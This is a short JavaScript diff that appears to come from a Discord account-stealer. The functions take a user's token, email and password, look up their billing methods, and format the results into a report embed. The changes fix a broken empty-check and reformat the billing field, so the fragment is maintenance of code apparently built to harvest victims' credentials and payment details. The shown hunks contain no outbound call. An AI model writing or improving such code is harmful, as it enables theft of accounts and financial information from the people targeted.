@@ -493,12 +493,9 @@ const fetchBilling = async (token) => {
 };
 
 const getBilling = async (token) => {
-  let billing = '';
   const data = await fetchBilling(token);
-  var len= arr.length;
-  if (len ==0) {
-    return '❌'
-  }
+  if (!data) return '❌';
+  let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
@@ -675,7 +672,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `Billing: ${billing} `,
+            value: `**${billing}**`,
             inline: true,
           },
           {
